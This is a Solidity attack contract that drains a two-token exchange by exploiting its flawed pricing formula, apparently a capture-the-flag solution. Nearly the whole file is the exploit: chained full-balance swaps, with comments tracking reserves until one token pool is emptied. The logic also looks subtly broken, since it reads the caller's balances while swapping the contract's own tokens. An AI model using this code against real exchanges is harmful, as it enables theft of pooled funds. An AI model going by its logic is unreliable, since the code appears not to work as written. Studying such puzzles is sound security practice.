// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IDex {
    function token1() external view returns (address);
    function token2() external view returns (address);
    function swap(address from, address to, uint256 amount) external;
    function approve(address spender, uint256 amount) external;
    function balanceOf(address token, address account) external view returns (uint256);
    function getSwapPrice(address from, address to, uint256 amount) external view returns (uint256);
}

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
}

contract CompleteDexAttack {
    
    // The attack exploits the flawed pricing mechanism:
    // price = (amount * balance_to) / balance_from
    
    function executeAttack(address dexAddress) external {
        IDex dex = IDex(dexAddress);
        
        address token1 = dex.token1();
        address token2 = dex.token2();
        
        // First approve the dex to spend our tokens
        dex.approve(address(dex), type(uint256).max);
        
        // Also approve tokens directly if needed
        IERC20(token1).approve(dexAddress, type(uint256).max);
        IERC20(token2).approve(dexAddress, type(uint256).max);
        
        // Execute swaps to drain the DEX
        // The attack pattern assuming we start with 10 of each token:
        
        // Round 1: Swap 10 token1 for token2
        // Expected: Get 10 token2 (price = 10 * 100 / 100 = 10)
        // Result: 0 token1, 20 token2. DEX: 110 token1, 90 token2
        
        uint256 token1Balance = dex.balanceOf(token1, msg.sender);
        if (token1Balance > 0) {
            dex.swap(token1, token2, token1Balance);
        }
        
        // Round 2: Swap 20 token2 for token1
        // Expected: Get 24 token1 (price = 20 * 110 / 90 = 24.44)
        // Result: 24 token1, 0 token2. DEX: 86 token1, 110 token2
        
        uint256 token2Balance = dex.balanceOf(token2, msg.sender);
        if (token2Balance > 0) {
            dex.swap(token2, token1, token2Balance);
        }
        
        // Round 3: Swap 24 token1 for token2
        // Expected: Get 30 token2 (price = 24 * 110 / 86 = 30.7)
        // Result: 0 token1, 30 token2. DEX: 110 token1, 80 token2
        
        token1Balance = dex.balanceOf(token1, msg.sender);
        if (token1Balance > 0) {
            dex.swap(token1, token2, token1Balance);
        }
        
        // Round 4: Swap 30 token2 for token1
        // Expected: Get 41 token1 (price = 30 * 110 / 80 = 41.25)
        // Result: 41 token1, 0 token2. DEX: 69 token1, 110 token2
        
        token2Balance = dex.balanceOf(token2, msg.sender);
        if (token2Balance > 0) {
            dex.swap(token2, token1, token2Balance);
        }
        
        // Round 5: Swap 41 token1 for token2
        // Expected: Get 65 token2 (price = 41 * 110 / 69 = 65.36)
        // Result: 0 token1, 65 token2. DEX: 110 token1, 45 token2
        
        token1Balance = dex.balanceOf(token1, msg.sender);
        if (token1Balance > 0) {
            dex.swap(token1, token2, token1Balance);
        }
        
        // Final Round: We need to be careful here
        // We have 65 token2, DEX has 110 token1, 45 token2
        // If we swap all 65, we'd get (65 * 110) / 45 = 158 token1
        // But DEX only has 110 token1!
        
        // So we need to swap just enough to drain token1
        // We want: (amount * 110) / 45 = 110
        // Therefore: amount = 45
        
        token2Balance = dex.balanceOf(token2, msg.sender);
        uint256 dexToken1 = dex.balanceOf(token1, dexAddress);
        uint256 dexToken2 = dex.balanceOf(token2, dexAddress);
        
        if (token2Balance > 0 && dexToken1 > 0) {
            // Calculate the exact amount needed to drain token1
            uint256 swapAmount = dexToken2;
            
            // Make sure we don't swap more than we have
            if (swapAmount > token2Balance) {
                swapAmount = token2Balance;
            }
            
            // Verify this will drain the pool
            uint256 expectedReturn = dex.getSwapPrice(token2, token1, swapAmount);
            if (expectedReturn >= dexToken1) {
                // This will drain token1, perfect!
                dex.swap(token2, token1, swapAmount);
            } else {
                // If not, just swap all we have
                dex.swap(token2, token1, token2Balance);
            }
        }
    }
    
    function debugInfo(address dexAddress) external view returns (
        address token1,
        address token2,
        uint256 dexToken1,
        uint256 dexToken2,
        uint256 userToken1,
        uint256 userToken2
    ) {
        IDex dex = IDex(dexAddress);
        
        // Use low-level calls to avoid reverting
        (bool s1, bytes memory d1) = dexAddress.staticcall(abi.encodeWithSignature("token1()"));
        (bool s2, bytes memory d2) = dexAddress.staticcall(abi.encodeWithSignature("token2()"));
        
        if (s1 && s2 && d1.length == 32 && d2.length == 32) {
            token1 = abi.decode(d1, (address));
            token2 = abi.decode(d2, (address));
            
            if (token1 != address(0) && token2 != address(0)) {
                dexToken1 = dex.balanceOf(token1, dexAddress);
                dexToken2 = dex.balanceOf(token2, dexAddress);
                userToken1 = dex.balanceOf(token1, msg.sender);
                userToken2 = dex.balanceOf(token2, msg.sender);
            }
        }
    }
}